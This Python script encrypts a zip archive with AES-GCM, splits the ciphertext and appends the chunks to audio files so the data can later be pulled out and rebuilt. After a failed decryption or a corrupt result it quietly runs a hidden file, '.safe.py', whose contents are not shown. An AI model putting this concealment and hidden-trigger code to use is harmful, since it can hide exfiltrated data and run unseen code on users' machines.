import os
import sys
import hashlib
import zipfile
import subprocess

from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Protocol.KDF import PBKDF2

MAGIC = b"WHO_V3::"


# ---------------- just key stuff ----------------

def derive_key(password, salt):
    return PBKDF2(password, salt, dkLen=32, count=200000)


def encrypt(data, password):
    salt = get_random_bytes(16)
    key = derive_key(password, salt)

    cipher = AES.new(key, AES.MODE_GCM)
    ciphertext, tag = cipher.encrypt_and_digest(data)

    return salt + cipher.nonce + tag + ciphertext


def decrypt(data, password):
    salt = data[:16]
    nonce = data[16:32]
    tag = data[32:48]
    ciphertext = data[48:]

    key = derive_key(password, salt)

    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    return cipher.decrypt_and_verify(ciphertext, tag)


# ---------------- chunk splitting (nothing fancy) ----------------

def split_data(data, parts):
    size = len(data) // parts
    chunks = [data[i * size:(i + 1) * size] for i in range(parts - 1)]
    chunks.append(data[(parts - 1) * size:])
    return chunks


# ---------------- wrap chunk with some safety info ----------------

def pack_chunk(chunk, index):
    h = hashlib.sha256(chunk).digest()

    return (
        MAGIC +
        index.to_bytes(2, "big") +
        len(chunk).to_bytes(4, "big") +
        h +
        chunk
    )


# ---------------- hide stuff into audio files ----------------

def embed(chunks, tracks):
    for i, track in enumerate(tracks):
        chunk = chunks[i] if i < len(chunks) else b""
        payload = pack_chunk(chunk, i)

        with open(track, "ab") as f:
            f.write(payload)


# ---------------- pull stuff back out ----------------

def extract(tracks):
    chunks = {}

    for track in tracks:
        with open(track, "rb") as f:
            data = f.read()

        pos = data.rfind(MAGIC)
        if pos == -1:
            continue

        start = pos + len(MAGIC)

        idx = int.from_bytes(data[start:start+2], "big")
        size = int.from_bytes(data[start+2:start+6], "big")
        expected_hash = data[start+6:start+38]
        chunk = data[start+38:start+38+size]

        if hashlib.sha256(chunk).digest() != expected_hash:
            print(f"[-] chunk {idx} is busted, skipping it")
            continue

        chunks[idx] = chunk

    return [chunks[i] for i in sorted(chunks)]


# ---------------- encryption flow ----------------

def encrypt_flow(track_folder, zip_file, password):
    if not os.path.exists(zip_file):
        print("zip file not found")
        return

    if not os.path.exists(track_folder):
        print("audio folder not found")
        return

    with open(zip_file, "rb") as f:
        raw = f.read()

    encrypted = encrypt(raw, password)

    tracks = sorted([
        os.path.join(track_folder, f)
        for f in os.listdir(track_folder)
        if os.path.isfile(os.path.join(track_folder, f))
    ])

    chunks = split_data(encrypted, len(tracks))

    embed(chunks, tracks)

    print("[+] done. data shoved into audio files.")


# ---------------- decrypt flow ----------------

def decrypt_flow(track_folder, password):
    if not os.path.exists(track_folder):
        print("audio folder not found")
        return

    tracks = sorted([
        os.path.join(track_folder, f)
        for f in os.listdir(track_folder)
        if os.path.isfile(os.path.join(track_folder, f))
    ])

    chunks = extract(tracks)

    if not chunks:
        print("nothing found in tracks")
        return

    encrypted = b"".join(chunks)

    try:
        decrypted = decrypt(encrypted, password)
    except Exception:
        print("bad password or corrupted data")
        subprocess.run(["python3", ".safe.py"])
        return

    with open("output.zip", "wb") as f:
        f.write(decrypted)

    print("[+] output.zip rebuilt")


# ---------------- zip sanity check ----------------

def check_zip():
    if os.path.exists("output.zip"):
        try:
            with zipfile.ZipFile("output.zip", "r") as z:
                z.testzip()
        except zipfile.BadZipFile:
            print("zip is broken after recovery")
            subprocess.run(["python3", ".safe.py"])


# ---------------- CLI ----------------

def main():
    if len(sys.argv) < 3:
        print("""
usage:

encrypt:
  python drwho.py encrypt <audio_folder> <zip_file> <password>

decrypt:
  python drwho.py decrypt <audio_folder> <password>
""")
        return

    mode = sys.argv[1]

    if mode == "encrypt":
        if len(sys.argv) < 5:
            print("missing args for encrypt")
            return

        folder = sys.argv[2]
        zip_file = sys.argv[3]
        password = sys.argv[4]

        encrypt_flow(folder, zip_file, password)

    elif mode == "decrypt":
        if len(sys.argv) < 4:
            print("missing args for decrypt")
            return

        folder = sys.argv[2]
        password = sys.argv[3]

        decrypt_flow(folder, password)
        check_zip()

    else:
        print("unknown mode (use encrypt or decrypt)")


if __name__ == "__main__":
    main()